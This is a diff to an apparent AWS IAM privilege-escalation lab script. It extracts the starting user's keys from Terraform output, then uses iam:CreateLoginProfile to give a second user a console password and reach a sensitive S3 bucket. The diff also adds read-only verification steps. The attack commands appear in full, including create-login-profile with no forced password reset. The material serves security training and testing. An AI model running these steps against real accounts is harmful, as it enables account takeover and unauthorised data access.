@@ -59,27 +59,58 @@ if [ -z "$MODULE_OUTPUT" ]; then
 fi
 
 # Extract credentials
-ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
-SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 
-if [ "$ACCESS_KEY" == "null" ] || [ -z "$ACCESS_KEY" ]; then
+if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+# Extract target bucket name from module output
+TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.sensitive_bucket_name')
+
+AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
+if [ -z "$AWS_REGION" ]; then
+    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
+    AWS_REGION="us-east-1"
+fi
+
+echo "Retrieved access key for: $STARTING_USER"
+echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
+echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved credentials${NC}\n"
 
 cd - > /dev/null  # Return to scenario directory
 
-# Export credentials as environment variables
-export AWS_ACCESS_KEY_ID=$ACCESS_KEY
-export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
-unset AWS_SESSION_TOKEN  # Clear any session token
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
 
 echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"
 
-# Step 2: Verify starting user identity
+# [EXPLOIT] Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -91,39 +122,23 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Discover target bucket
-echo -e "${YELLOW}Step 4: Discovering target bucket${NC}"
-# Try to get bucket name from Terraform output first
-pushd $TERRAFORM_DIR > /dev/null
-TARGET_BUCKET=$(terraform output -raw prod_one_hop_to_bucket_iam_createloginprofile_sensitive_bucket_name 2>/dev/null || echo "")
-popd > /dev/null
-
-# If Terraform output not available, try to discover via naming pattern
-if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "null" ]; then
-    echo "Terraform output not available, using expected naming pattern..."
-    # Look for buckets matching our naming pattern
-    TARGET_BUCKET=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-sensitive-data-iam-004-')].Name | [0]" --output text 2>/dev/null || echo "")
-
-    if [ -z "$TARGET_BUCKET" ] || [ "$TARGET_BUCKET" == "None" ]; then
-        echo -e "${YELLOW}Warning: Could not discover target bucket${NC}"
-        TARGET_BUCKET="pl-sensitive-data-iam-004-${ACCOUNT_ID}"  # Fallback pattern
-    fi
-fi
-
+# [OBSERVATION] Step 4: Identify target bucket
+echo -e "${YELLOW}Step 4: Identifying target bucket${NC}"
 echo "Target bucket: $TARGET_BUCKET"
-echo -e "${GREEN}✓ Identified target bucket${NC}\n"
+echo -e "${GREEN}✓ Identified target bucket from Terraform output${NC}\n"
 
-# Step 5: Check if hop1 user already has a login profile
+# [EXPLOIT] Step 5: Check if hop1 user already has a login profile
 echo -e "${YELLOW}Step 5: Checking if hop1 user has a login profile${NC}"
 echo "Checking for existing login profile for user: $HOP1_USER"
-
+use_starting_creds
 show_cmd "Attacker" "aws iam get-login-profile --user-name $HOP1_USER"
 if aws iam get-login-profile --user-name $HOP1_USER &> /dev/null; then
     echo -e "${RED}⚠ Login profile already exists for $HOP1_USER${NC}"
@@ -134,7 +149,7 @@ else
 fi
 echo ""
 
-# Step 6: Verify we don't have S3 bucket access yet
+# [EXPLOIT] Step 6: Verify we don't have S3 bucket access yet
 echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
 echo "Target bucket: $TARGET_BUCKET"
 echo "Attempting to list bucket contents (should fail)..."
@@ -147,12 +162,12 @@ else
 fi
 echo ""
 
-# Step 7: Create login profile for hop1 user
+# [EXPLOIT] Step 7: Create login profile for hop1 user
 echo -e "${YELLOW}Step 7: Creating login profile for hop1 user${NC}"
 echo "Creating console password for user: $HOP1_USER"
 echo "Password: $PASSWORD"
 
-show_attack_cmd "Attacker" "aws iam create-login-profile --user-name $HOP1_USER --password "$PASSWORD" --no-password-reset-required"
+show_attack_cmd "Attacker" "aws iam create-login-profile --user-name $HOP1_USER --password \"$PASSWORD\" --no-password-reset-required"
 aws iam create-login-profile \
     --user-name $HOP1_USER \
     --password "$PASSWORD" \
@@ -171,10 +186,18 @@ echo -e "${YELLOW}Waiting 15 seconds for IAM changes to propagate...${NC}"
 sleep 15
 echo ""
 
-# Step 8: Verify we now have the login profile
-echo -e "${YELLOW}Step 8: Login profile has been successfully created${NC}"
-echo "The hop1 user can now log in with the new password."
-echo -e "${GREEN}✓ Confirmed login profile creation!${NC}\n"
+# [OBSERVATION] Step 8: Confirm login profile creation
+echo -e "${YELLOW}Step 8: Confirming login profile creation${NC}"
+use_readonly_creds
+show_cmd "ReadOnly" "aws iam get-login-profile --user-name $HOP1_USER --query 'LoginProfile.UserName' --output text"
+PROFILE_USER=$(aws iam get-login-profile --user-name $HOP1_USER --query 'LoginProfile.UserName' --output text 2>/dev/null)
+if [ "$PROFILE_USER" == "$HOP1_USER" ]; then
+    echo -e "${GREEN}✓ Confirmed login profile created for $HOP1_USER${NC}"
+else
+    echo -e "${RED}✗ Could not confirm login profile creation${NC}"
+fi
+echo "The hop1 user can now log in via the AWS Console."
+echo -e "${GREEN}✓ Login profile confirmed!${NC}\n"
 
 # Summary
 echo -e "${GREEN}========================================${NC}"
